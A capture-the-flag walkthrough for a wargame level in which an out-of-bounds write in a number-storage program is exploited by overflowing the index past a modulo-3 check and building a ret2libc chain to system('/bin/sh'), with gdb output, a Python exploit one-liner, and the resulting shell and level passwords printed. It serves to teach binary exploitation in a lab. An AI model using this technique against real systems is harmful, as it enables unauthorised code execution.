# Walkthrough

## 1. Download the binary

```bash
scp -P 2222 level07@localhost:~/level07 .
# Password: GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8
```

## 2. Analyze with Ghidra

Open the binary in Ghidra and examine the `main`, `store_number`, and `read_number` functions.

## 3. Understand the program flow

**Program behavior:**
1. Zeroes out all `argv` and `envp` arrays (prevents environment variable exploits)
2. Creates a data storage array: `unsigned int data[100]` (400 bytes)
3. Provides three commands:
   - `store` - Store a number at an index
   - `read` - Read a number from an index
   - `quit` - Exit the program

## 4. Identify the vulnerability

**Out-of-bounds write in `store_number()`:**
```c
if ((index % 3 == 0) || (number >> 24 == 0xb7)) {
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    return 1;
}

data[index] = number;  // No upper bound checking!
```

**Security checks (both bypassable):**
1. Blocks indices divisible by 3
2. Blocks numbers with top byte `0xb7` (old libc addresses)

**Critical flaw:** No validation that `index < 100`

## 5. Find the saved EIP location

```bash
ssh level07@localhost -p 2222
# Password: GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8

gdb ./level07
(gdb) break main
(gdb) run
(gdb) info frame
```

**Output:**
```
Saved registers:
 eip at 0xffffcf2c
```

Find the data array start (0x1bc = 444 bytes):
```bash
(gdb) p/x $ebp - 0x1bc
$1 = 0xffffcd6c
```

**Calculate EIP offset:**
```
(0xffffcf2c - 0xffffcd6c) / 4 = 456 / 4 = 114
```

The saved EIP is at **index 114**.

**Problem:** `114 % 3 == 0` (blocked by security check)

## 6. Bypass the modulo-3 check using integer overflow

**Goal:** Write to index 114 without triggering `index % 3 == 0`

**Solution:** Use 32-bit integer overflow

When calculating byte offset: `index × 4`

If we use index `1073741938`:
```
1073741938 × 4 = 4294967752
4294967752 mod 2^32 = 456
456 / 4 = 114 (our target index!)

But: 1073741938 % 3 = 1 (bypasses the check!)
```

## 7. Find required addresses

**Find system() address:**
```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

Convert to decimal: `4159090384`

**Find "/bin/sh" string:**
```bash
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
```

Convert to decimal: `4160264172`

## 8. Construct the ret2libc chain

**Stack layout after overwrite:**
```
Index 114 (EIP):        0xf7e6aed0  (system)
Index 115 (return):     0x00000000  (dummy)
Index 116 (argument):   0xf7f897ec  ("/bin/sh")
```

## 9. Build the payload

**Action 1:** Overwrite EIP with system()
```
Command: store
Number:  4159090384   (system address)
Index:   1073741938   (overflows to 114)
```

**Action 2:** Set first argument to "/bin/sh"
```
Command: store
Number:  4160264172   ("/bin/sh" address)
Index:   116
```

**Action 3:** Trigger execution
```
Command: quit
```

## 10. Execute the exploit

```bash
(python -c 'print "store\n4159090384\n1073741938\nstore\n4160264172\n116\nquit"'; cat) | ./level07
```

**Output:**
```
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                
----------------------------------------------------
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command: whoami
level08
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

## 11. Flag

```
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
